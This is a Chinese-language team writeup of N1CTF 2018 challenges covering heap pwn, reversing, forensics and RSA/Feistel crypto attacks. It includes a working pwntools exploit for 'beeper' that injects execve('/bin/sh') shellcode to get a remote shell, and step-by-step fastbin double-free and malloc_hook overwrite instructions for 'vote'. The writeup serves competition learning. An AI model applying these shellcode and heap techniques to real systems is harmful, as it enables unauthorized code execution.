# N1CTF 2018 writeup 

`******`

### null
只有malloc的程序，但是用了线程，漏洞是个明显的溢出。

几个人脑袋都很僵硬，就想着触发malloc过程里的_int_free了，一场debug-driven pwning。

### LFI
luajit的逆向，实际是js写的东西，然后转换而来的。总之就是读取你的输入作为key，和一个明文进行AES，然后结果要和另外一个白盒AES的相同。于是就是从白盒AES过程中恢复key，类似于34c3ctf的fuckbox。

逆向、搜索、然后参考niklasb的脚本，详细分析见`LFI/README.md`。

### apfs
这道题给了个dmg文件，请有Mac的同学挂载，发现有密码，然后密码在最后一行找到。打开发现是众多空文件，于是开始脑洞。

脑洞1：新功能？开始搜，乱找找到了<https://arstechnica.com/gadgets/2017/02/testing-out-snapshots-in-apples-next-generation-apfs-file-system/>。猜测有snapshot，然后用了博主的小工具<https://github.com/ahl/apfs/>，发现在10.13上面权限不够，各种不好使。到了10.12也是如此，但是惊人的发现博主提到的官方隐藏神秘小工具`apfs_snapshot`只有10.12有。然后开始恢复snapshot，结果发现恢复完啥也没变。

脑洞2：是不是文件元数据？把finder的所有列都开了，然而没有发现。

根据提示，apfs的时间精度是ns，结合脑洞2，可以提出ns为单位的时间，见`apfs/t.go`和`apfs/get.py`。

又有异或的说法，于是回到脑洞1，猜测恢复实际成功了，但外表看不出，因为变化的是mtime的小数点后几位。那么就分别提出两次的时间，做异或即可。具体操作见`apfs/README.md`。

### baby_N1ES

加密过程和`round_add`都是可逆的，直接在源码文件中加入解密用代码如下：
```
...
def re_round_add(a, b):
    f = lambda x, y: x + y - 2 * (x & y)
    res = ''
    for i in range(len(a)):
        t1=ord(a[i])
        t2=ord(b[i])
        t3=-1
        for j in range(256):
            if f(t1,j)==t2:
                t3=j
                break
        assert t3>=0
        res += chr(t3)
    return res
...

    def decrypt(self, plaintext):
        if (len(plaintext) % 16 != 0 or isinstance(plaintext, bytes) == False):
            raise Exception("plaintext must be a multiple of 16 in length")
        res = ''
        for i in range(len(plaintext) / 16):
            block = plaintext[i * 16:(i + 1) * 16]
            L = block[:8]
            R = block[8:]
            L, R = R, L
            for round_cnt in range(32)[::-1]:
                L, R = (re_round_add(R, self.Kn[round_cnt])), L
            res += L + R
        return res
...
```
然后修改`challenge.py`运行直接得到flag,`N1CTF{F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/}`

### easy_fs

本题提供了一个rsa加密后的文件读取功能，每次`n`均随机生成而`e`可以自己指定，容易想到令`e`为3时对同一文件取3次结果可以用中国剩余定理直接得到`m^3`从而取得明文。

实际操作时解出来不对，拿那个小文件试了下发现出来的密文长度不符合，似乎程序里面有overflow之类。后来偶然发现先在选项3里面生成`n`再进入选项2能够正常拿到小文件的加密结果，于是同理操作一下后即得到flag，过程如下：

```
sage: c1= 0x5088e10c95ad86883a3ba370517f9bfc4b87adf5b878a2d23b87e2f89179ce4dee1525caa8bfb850e3e8d258a15239eceb7da850e5511afaf49b80dcbc0158fb271be16f5e0d2c55af6261c0feb985634f757a8fb12d76cc52790ad755b6805bdd3aae8cf7eecc083f6e7fd3e1dc458ae62ab4344ff34a22d1028646d13a48220393fcd4b3458794cd48c2639d84804ecb8afc9ca68e749758903289d18d7b088da87319158adeab92384d42725a1ab795b1c7106d8b5e453c637b1b28cef5918ba1680c35e57bd3c04ecc9b7fe017b57a7ad0cf27a88694e717541bf6f67f1ca8e69525b5e9b852ca392ada9da0bae48a65ba4723cca1a548b1c5096ab0d8f2
sage: n1=0x547027be15026d1a6b23beebbcee09c0f84ed6f92923436003e2d5b58e38bd10d2c22122c2c8f65a2908b27075ed224e8866c92d5397673f77106de4b2a3d15dca9ef36664c09d6eb9daf51bf4464fb2faccfe1e04ac66af5640f089a2c9c067f70ce9eac22d94a7adb2e512057903ec7ef1de364f441747583220ecefeaf6fc437e3918712c68095b6d17c6c56fffa247ec8eda8c82e28f71cd781c9c43b51157c9a3585fb78541864b87a4d30245041f50992bce1d55f5c01c381166309aa7cf58f0f1ca7c8632f66fea6a3f7b5cacd0db95e61066595058afaf516c0bcbed9a9cabd86a59d5e61bf690c7f071fff12f2a7de976956936c10fa56dfdfc0eed
sage: c2=0x5d776e7d6004ccc72d873a13a152a6ab20f52eab9f8479392317747a1f71ab191b52041279f48247542a8c8c216e4a6f5a796adc3a7b3a5b65d54d819ae42e07c89f6f780335800fefa14c7d7b907eb0d9328b7caa3f36656c8d4167b2a2d8c2a37834bd135b11868c1e8f9e30d259a198b8ec52098957c1ed0ee68bc9e236fddefb3846b0074ae564c293a231b282e3f153b58d84882049734f67c0583cd4855aee4147e504932b7584d7ee4c3507d90814371ae1041a09f67994dd182beae4bdb12e062798579dc1abe1fa1f679d017176a9425503193913e6333a42b69bea87432dbe4b35ece7d80ea2939e01a9c7ea693fee0cb09547447e35d4b2b464f
sage: n2=0x151b23198245321ad5e34747679ea94a6d0db0aebe6cf983e43d5e731f7f38f289a0c85fd12528ffda2f616be95ff6388319ec54283d29d6e83933b6fc0720e42f137eab36bb0436f3601a2c809a7db62c7321af9f430fdf4187876b8945c29e42064f118a036139697697ffa777009c363bbd0e5d3aa139fc4e8988b1135516638d2198d626e6739205bb21646dea76a5abb4f64cf62f6f0fffe6a7e37cbb58890ff645cd03e345ea6b763a4fe814a6678ed8e44b92ff47edfab621229619b3f50cc920d20e6693f75365708b5be1588f522f83d7d2f6227f3fc2dbc6ba92c88033b15509e62a389f3bc08c172e66174d4e7eedf04bd4d428e4a40a154f14f3
sage: c3=0x5b67b5ab3a3680f54bebf8d7fba8555f75c9ae93bb417060372e5ccd21606ea3d58e98b335f28b3374aa8c4c476e0134df2bf6a6cb9f118582231f858fb2238e142aba99b5658830c479b6345c18d487aca97e6927012bbd812557d5f235c8293e024e7b47c12d3844e4f612674b25257d1782b634f200200d8a9e39560e2c127ca72b3a94e2e2e167cf7ea2d5fe6dc6751693afd9d964a39d6030b235586c4552cdb6bc75e5b6cf403e3da9aa5dcd39263f1abc920762d255f5c29183fedeb539f6c1c0c0a50a68ebbc9aa517fee89af2f860cc3f4975233d1061e671dd9fa248af3b90327fd0b3c032f3a2c5cadfc457eb544543a944614857d40e9087d77d
sage: n3=0x60bd48918fa08bcf4525b3cb89a92f6f8a622b531dfdf561c93d8792bf24d604e7e95f3afa6faa2d446c24e0db2956944f2e51c2e8f27eb2cb16b7ff08329e707ed6252346e1655662d16e809d3e0d35b98b51145b8f432e352afa3e17893e86604e4faa1f1b8c35c93310a4bb7d8f939a6d7af761acf579765e3e014de4f672f50c836f35324cc9a21d91436475b3495e97b9407bdd3b14b547ed5e772f6ba356a335c9035f0febf243fd4ee163b4bea058f8e792e1b2f3e0aca74cadce002692b22920bc0189ab9415987018e26f353132ade4fd7bd4e3693408eda63b1f745c97795d2cfbcab03522c5f020d743fb98b65d4c7a1eca39bafb098708b73883
sage: a=crt([c1,c2,c3],[n1,n2,n3])
sage: a
107209238476405205529880640957547601570201489566593958027523938377396523155516522098530516909467650332214086079603967880016421898706848583731397980266305108941738061932810799183090798335195929398601106810778333634022658737831837780816029396051198376063483522429019241426002545783171400359760610959366479409729330321452494589651912066446893198829642209565432578704787354243330359637613435328763414491412307499964076676999552200841154604388645266303429940797475036769283956250059942543731997609027733627086915905850358815366815363530408443435601887386018024159685920223160070407654486040297130456722533426867182491107753228786695672296821095650276151856395402096838080870173299014385897140518449137293923096794500276199333226454084698849251528990092136769214697637835698595832378079111351472280769677126862383451919675043370677293567855563616067494193278817200790006739970190518524999473940389109070691524705440133767633549361763726912501280777043949265160596390731674539338446094784037019092747150369958885990319826324328590934468320792559502187911034875977260617479009415303706801564546950144067242692405056420437934449244495106043763520069696660620138443702580245585399872111811598706071799180337750113608250313031006040229545748082667638480131359876009609216403469400956967272817587059970240927742029177049872247841935719169438451730000655998171449002320247553101109499552630584564008379399850842722749550880206039389606103951840683732098554779140959596471294969121667886624633622670323334192949799475611598150660706287236469247928431728780239974715936020069

#cubic root
#N1CTF{A_sm4ll_l34k_l3ad5_t0_l4rge_br34k}
```

### rsa_padding

本题可以为相同明文加上一个指定padding，然后rsa加密后输出，虽然padding内容为用户输入经过sha256其值比较大，但数值已知，可使用related message类的解法。设明文为未知数`x`，由于`e`为3多项式最高次数较小，于是通过3次交互获得3个方程，互相消元分别把`x^3`和`x^2`消去，最后得到关于`x`的一次方程就很容易解出来了。主要过程如下：

```
>>> n
21727106551797231400330796721401157037131178503238742210927927256416073956351568958100038047053002307191569558524956627892618119799679572039939819410371609015002302388267502253326720505214690802942662248282638776986759094777991439524946955458393011802700815763494042802326575866088840712980094975335414387283865492939790773300256234946983831571957038601270911425008907130353723909371646714722730577923843205527739734035515152341673364211058969041089741946974118237091455770042750971424415176552479618605177552145594339271192853653120859740022742221562438237923294609436512995857399568803043924319953346241964071252941L
>>> ct
[14550589053226237723784378782911157204367764723813789158271625147472004207734354619642445255036997940341703539883653916130592718879734436263217819317202435434496341973502556894834798718992952369685841347018901038478081710519253844078907000973324354805502890255414196801758171762906898874914776720897920729518384393581853690034053515213192846817920534901501370942556249012415259244063185938984570137371682805276444650716010228924732495062415330875872004691866847132147232457398743319930259327973290858489741376000333603734294893832124907092640953321640151851853501528390729805151850605432707293088635480863375398001441L, 14550589053226237723784378782911157204367764723816957959635387925652898370034365455451983914571405062459535687617841302966938233065296973978472553109061974458935966754832788411876301179210585984208608247433383774246743661884093657109502619626436726032508763685599880808525861655167503719155953736308920858354069083437923495143680174206534169208623366776314544036377265501358254923029291010047210371394197963442022610746743020719292018028518885149189744832788117626194748311114409968846879212425054195323473068436359069318372735069308398135560733890706617536127579272964863500568572120716434126233695562326533941909353L, 14550589053226237723784378782911157204367764723812898300803072618455386120267041982477111696563359113145356106740914803103900168709338368889437032295721745098110315331405647837436176783086326956021315593482622691614719642891142643163326049930174763339544549182758724160835326786195320135168127469066476021086153307820565881013531426531129210649040032979719265102263182393762614764498380150223489209937290788836319628399775508359715815612106209296559214653153257390358105998405255247713175375832927947808548263225306735264633263654547021420103063442047329039685922247255259773831297318489595760311499938789997139902484L]
>>> a
[[145906391829629504394329442483884261780519925772709385916911295628161976766945L, 7096225058913791798291871399103984104229452781525539152972530523936116438110989511434380105463755365502160540924030434901789042172125114435316651614877675L, 115042732661901268901270806675242282269494281476850863888652217920587290673323431093478529507032717557609433256185866669881206278288573019094085589466665919855162658416146607914827818524147007268576202039592578393133966562017605875L], [288282484931928200500103603914278475374690145486290828653385985998399993479583L, 27702263706175803322709996424960648988764538033208923646383670473925715920624355910061231665634132377985971032669314442311129551184126222847125638612617963L, 887341935495103054226893174572017511318867721850097017751358001255548197853444202196608547122938427548872685374932407312895130006774914407592902672972773709614274870808187585725601137888199666395032380647363241788879345958824394381L], [105879646280359341464573093395103654104844033181528975278896035746067615965034L, 3736833165484670577575200562015373298949417175564273941980565292287489326516304326535648946043400691499057614762577017589447048672750024043151826370207052L, 43961619307803602735392900645210230192605356021167223791658765766238161059787181040348901263947635368273903155319464932610818328762478890471988409002501069381062097335961962110317497150836200372672784768497313023586883463041357752L]]
>>> a2
[[40026745549270162929756349088780607675675892591180410638015259882094360801911L, 3359391893429121220716670837088610805280035605961265210991965231648627111594685184898731159420354674003102926161453417312341993499375090392164825244670623L, 71081113354097666165877906030032052076888925455683640096993452154349129613536250053129628243085082189335530100866401737270387949526094128622097180464164850474100561080184645804510321373310806895903417271095265369547083098976248123L], [182402838651568859035530510519174821269846112304761853374489950252332377514549L, 23965430540691132745134795862945275689815120857644649704403105181638226594108051583525582719590731686486913417906737424721682502511376198803973812242410911L, 843380316187299451491500273926807281126262365828929793959699235489310036793657021156259645858990792180598782219612942380284311678012435517120914263970272640233212773472225623615283640737363466022359595878865928765292462495783036629L]]
>>> a1=a[:]
>>> for i in range(2):
...     for j in range(3):
...             a2[i][j]=a1[i][j]-a1[2][j]
...
>>> a2
[[40026745549270162929756349088780607675675892591180410638015259882094360801911L, 3359391893429121220716670837088610805280035605961265210991965231648627111594685184898731159420354674003102926161453417312341993499375090392164825244670623L, -890857468552529016618087467312637165333558473638827196347433142739113026692550170396067373780787021480690336386026642096909057398621935906625413664525753536278346863362067628111200915580951043149591465958341072655472640922844976711578739746649251831444708432231085761287809020522088682063636168880501921782105840293066618652644479564805717679967573336725850562218992284182643676091223766669024585860635689583976205539073329365244987134894616610262044279455842387077342375533008080397421507687415779031742627521774770814096720513657383525840437511765994990279281850834L], [182402838651568859035530510519174821269846112304761853374489950252332377514549L, 23965430540691132745134795862945275689815120857644649704403105181638226594108051583525582719590731686486913417906737424721682502511376198803973812242410911L, -4059658832315307197512249767323472974872218008045949314179580876926499863038064355958605089035520813340229360825651423427140574440124396124259028187292653950761082632024018992951013946176569696261962692964214502841156647690534868972183583987826267242444837267915775617357614130148747675404958559583333796595278934114083107595640158530910016443404974157455683105429055539686386097210373486618716153395040869598066578815486053063295730341523237809906634572544520899374321618222350500497406442817437235885816270818041742068866363271252442630959499993430331074041018970240L]]
>>> a2[2][0]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
IndexError: list index out of range
>>> a2[1][0]
182402838651568859035530510519174821269846112304761853374489950252332377514549L
>>> tmp2=inverse(a2[0][0],n)*a2[1][0]%n
>>> a2[1][0]*tmp2%n==a2[0][0]
False
>>> tmp2=inverse(a2[1][0],n)*a2[0][0]%n
>>> a2[1][0]*tmp2%n==a2[0][0]
True
>>> for i in range(2):
...     for j in range(3):
...             a2[i][j]=(a1[i][j]-a1[2][j])%n
...
>>> tmp2=inverse(a2[1][0],n)*a2[0][0]%n
>>> a2[1][0]*tmp2%n==a2[0][0]
True
>>> for j in range(3):
...     a3[j]=(a2[0][j]-tmp2*a2[1][j])%n

>>> a3
[0L, 21727106551797231400330796721401157037131178503238742210927927256416073956351568958100038047053002307191569558524956627892618119799679572039939819410371609015002302388267502253326720505214690802942662248282638776986759094777991439524946955458393011802700815763494042802326575866088840712980094975335414387283865492939790773300256234946983831571957038601270911425008907130353723909371646714722730577923843205527739734035515152341673364211058969041089741946974118235191838553074448078604388746589772123881193028151674296435585185974126164181743833284186452661504058252615937822470645029637000350158629168355716828502535L, 283396883187746579240243462012327405744459627468567736427280119179223333571956736105587766179907123994550095309080015375090569659648208868598428776532819309399608511086201543921879378577332609111515838005508258830319300881889495568384241085458337838181189865580457181907241147252319269884430073248712519324614477507183710656932668120487003102155622790422673390481965747088100091793181448180112708526L]
>>> tmp3=inverse(a3[1],n)*a3[2]
>>> tmp3
1613588475302897350570283031895631844179108942603345572605116094860835331243514491616227922507564017328724323515882955750411278494975917049458303249923752102124781290672651549704289982129334603762356878127757426692218384452534122440622817608277679989249676083621677722904813687382376781165250100110539741667151809596635489218406158576782775219954247717621897818430864397379505028738085422173282409707718841960629815762274634725905078346830333550540746929495147657510301886458831634719486274361530719137733481258335223961376718983403499225575533654780379068264555230840823700802656329297832952296846071782402384909357161424182123841529939241588894602087993937454030849186583005861510282911512029363160823571591342704018787592857606357709056275756336274536530685041328004924657078495063307950572821833973873864800322044570918868140317788872423808403250168678343296620268873747323112772595262145657372068882530680324752789687658846373190838523035377539431062388705394113094691347733277274812330793400348359692080087486L
>>> ans=-tmp3%n
>>> hex(ans)
'0x57656c636f6d20746f204e75314c204354462c20436f6e67726174756c6174696f6e732c20596f752067657420666c61672c20616e6420666c6167206973204e314354467b66376566626634653566356566373863613166623963386635656230323633357dL'
>>>

#N1CTF{f7efbf4e5f5ef78ca1fb9c8f5eb02635}
```

### beeper

homu~

正常的菜单题，然而首先需要密码登陆，逆向发现登陆过程中的判定是跑一个类brainfuck解释器，查看类brainfuck代码发现就是把输入遍历一遍加加减减之类，相邻元素相减再减掉个位置有关的常量得到密码为`BokuWaDokoNiIruNo?`，即可进入程序。

程序逻辑存在UAF可以读取已经释放的内容，由于程序中申请了一段RWX的段并会在后面执行，我们只需利用UAF泄露该段地址（似乎内存布局被构造为刚好可以泄露该地址），然后用brainfuck输入中的溢出覆盖掉brainfuck代码及数据段指针，令其修改RWX段中的内容为shellcode即可。brainfuck代码长度有限，不过我们是在原RWX段程序的基础上进行修改，改个syscall编号等关键内容即可，exp如下：

```
from pwn import *

context.log_level='debug'

c = remote('47.98.57.19',23333)
c.sendlineafter('password:\n','BokuWaDokoNiIruNo?')
c.sendlineafter('choice>>','2')
c.sendlineafter('remove?','2')
c.sendlineafter('choice>>','2')
c.sendlineafter('remove?','1')
c.sendlineafter('choice>>','1')
c.sendlineafter('number:','1')
c.recvuntil('phone number:')
leak=u64(c.recv(8))
print hex(leak)

raw='hod \x01\x814$\x01\x01\x01\x01H\xb8uy a phoPH\xb8an not bPH\xb8er,you cPH\xb8Bad hackPj\x01Xj\x01_j#ZH\x89\xe6\x0f\x05\xc9\xc3'
raw2='686f6420018134240101010148b8757920612070686f5048b8616e206e6f7420625048b865722c796f7520635048b82f62696e2f736800506a3b58545f5257545e0f05'.decode('hex')
prog=''
for i in range(len(raw2)):
    dd=(ord(raw2[i])-ord(raw[i]))&0xff
    if dd>128:
        dd=(ord(raw[i])-ord(raw2[i]))&0xff
        prog+='u'*dd
    else:
        prog+='m'*dd
    prog+='h'
prog+='\x00'
print len(prog)

p='8613810962ff44d33fcd19b0fb88fdae20df'.decode('hex')
p=p.ljust(0x2021e8-0x202180,'\x00')
p+=p64(leak)
p+=prog

c.sendlineafter('choice>>','4')
c.sendlineafter('password:\n',p)
c.sendlineafter('choice>>','3')
c.interactive()
#N1CTF{5h3l1_c0d1n9_w17h_Hbf_1s_s0_e45y_233}

```

### patience

haskell逆向，而且是strip的，不过至少有个`dump.cmm`文件可以参照一下。看了许久之后大概知道程序只做输出，只是因为递归调用导致执行得特别慢，`flags_closure`中为数据而`f_closure`为递归逻辑，同时看到了4个数组s0,s1,s2,s3。

`flags_closure`中给出的为一串二元组`(a,b)`，通过逆`f_closure`知道`a=0`时`b`就是s0的索引，`a>0`时就会有递归。然后在binary的`0x4ad380`附近找到`flags_closure`的内容，patch一下可以看`a=1`不同`b`的输出结果，发现此时整个序列呈s1+s0+s2+s0+s3的形式，再尝试一下`a=2`之类猜测第`i`个序列为`A_i=s1+A_{i-1}+s2+A_{i-1}+s3`，于是提取出`flags_closure`另外写个比较快的脚本就直接输出flag了，如下：

```
def solveh(a,b):
	while a!=0:
		idx=b/94
		if idx<1:
			return s1[b]
		elif idx<ll[a-1]+1:
			b=b-94
			a=a-1
		elif idx<ll[a-1]+2:
			return s2[b%94]
		elif idx<2*ll[a-1]+2:
			b=b-94*(ll[a-1]+2)
			a=a-1
		elif idx<2*ll[a-1]+3:
			return s3[b%94]
		else:
			print 'out of range'
			return
	return s0[b]

for i in range(len(a1)):
	ans+=chr(solveh(a1[i],a2[i]))

#N1CTF{did_cmm_helped?1109ef6af4b2c6fc274ddc16ff8365d1}
```


### Lipstick

翻到图片低比特位里的加密zip包以及图中YSL符号，找个比较精准的色跟号颜色比对页面，把图片中色号拼出来后比特数刚好为8的倍数，然而为非ascii字符，开头3个字节看上去像BOM头，于是尝试用utf8编码显示。

前面都是队友弄的，然后我发现出来的这段东西跟“白学家”只差一个bit，猜测是色号对比误差然后试了一下密码就拿到flag了


### vote
菜单题  
一开始看起来比较复杂，在vote函数里还开了一个线程修改了一个全局变量，本来想着需要用到竞争的方法来绕过cancel函数里的一些判断，但后来发现不需要vote也能做。cancel函数里有一个double free的漏洞，并且在show函数里也不检查空间是否被free。

- 先通过申请unsort bin再free，通过show拿到libc的偏移地址。  
- 申请两个相邻大小的堆块A和B，然后free掉触发合并。  
- 再申请A+B大小的堆块，就可以覆写A,B里面的内容，这时在B地址伪造成一个假的fast bin大小的堆块。  
- 利用cancel的函数bug再次free B， B被放入fast bin arena中。  
- free 掉第三步申请的A+B，再次申请A+B大小的堆块，并将B的fd指针指向malloc hook附近。
- 申请两次B大小的堆块，将malloc hook改为gadget地址。  
